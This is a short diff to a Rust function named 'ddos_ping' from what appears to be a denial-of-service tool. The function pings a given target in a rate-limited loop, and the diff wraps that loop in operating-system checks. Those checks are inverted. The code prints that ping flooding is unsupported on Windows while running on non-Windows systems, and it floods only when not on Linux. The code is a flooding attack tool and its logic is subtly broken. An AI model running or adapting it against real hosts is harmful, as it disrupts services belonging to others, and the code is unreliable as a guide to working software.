@@ -22,10 +22,16 @@ fn ping(target: String){
 
 pub(crate) async fn ddos_ping(rx: &mut mpsc::Receiver<()>, target: String, rate_limit: u64) {
 
-    let mut cmp = 0;
+    if !cfg!(target_os = "windows"){
 
-    loop {
-        tokio::select! {
+        println!("Ping DDOS non pris en charge sur windows")
+
+    }else if !cfg!(target_os = "linux") {
+
+        let mut cmp = 0;
+
+        loop {
+            tokio::select! {
             _ = sleep(Duration::from_nanos(rate_limit)) => {
                 println!("cmp = {}", cmp);
                 ping(target.clone());
@@ -37,9 +43,9 @@ pub(crate) async fn ddos_ping(rx: &mut mpsc::Receiver<()>, target: String, rate_
                 break;
             }
         }
+        }
+
     }
-
-
 
 
 
